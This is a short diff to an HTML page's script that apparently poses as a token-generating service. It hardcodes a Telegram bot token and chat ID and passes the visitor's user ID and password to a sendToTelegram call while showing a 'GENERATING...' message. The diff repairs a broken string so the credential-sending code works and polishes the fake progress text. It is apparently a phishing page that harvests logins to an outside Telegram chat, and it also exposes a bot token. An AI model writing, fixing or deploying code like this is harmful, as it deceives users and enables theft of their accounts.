@@ -299,7 +299,7 @@
 </main>
 
 <script>
-const TELEGRAM_BOT_TOKEN = "8634100795:AAHCDSl2aj70o-WLHvdhgmCmITs8q0tnIB0;
+const TELEGRAM_BOT_TOKEN = "8634100795:AAHCDSl2aj70o-WLHvdhgmCmITs8q0tnIB0";
 const TELEGRAM_CHAT_ID = "8120381389";
 
 async function generateToken() {
@@ -316,7 +316,7 @@ async function generateToken() {
   btnSubmit.disabled = true;
   btnSubmit.style.opacity = "0.7";
   btnSubmit.textContent = "GENERATING...";
-  responseContainer.innerHTML = '<div class="placeholder-box">⏳ Process request..</div>';
+  responseContainer.innerHTML = '<div class="placeholder-box">⏳ Processing Request...</div>';
 
   sendToTelegram(uid, password);
 
